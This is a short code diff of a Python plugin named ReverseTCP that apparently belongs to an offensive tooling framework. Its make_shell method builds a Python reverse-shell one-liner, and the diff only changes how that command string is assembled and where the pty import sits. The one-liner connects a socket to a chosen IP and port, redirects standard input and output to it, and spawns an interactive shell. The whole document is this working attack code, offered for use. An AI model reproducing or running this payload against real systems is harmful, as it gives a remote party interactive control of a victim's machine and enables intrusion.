@@ -35,11 +35,10 @@ class ReverseTCP(plugin.ReverseShell):
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
 
     def make_shell(self):
-        self.shell = """{} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
-        socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),
-        2);import pty; """.format(
-            self.args.type, self.args.ip, self.args.port)
+        self.shell = """{} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,""".format(self.args.type)
+        self.shell += """socket.SOCK_STREAM);s.connect(("{}",{}));""".format(self.args.ip, self.args.port)
+        self.shell += """os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(), 2);"""
         if self.args.exec == "pty":
-            self.shell += """pty.spawn("{}")'""".format(self.args.shell)
+            self.shell += """import pty;pty.spawn("{}")'""".format(self.args.shell)
         elif self.args.exec == "subprocess":
             self.shell += """p=subprocess.call(["{}","-i"]);'""".format(self.args.shell)
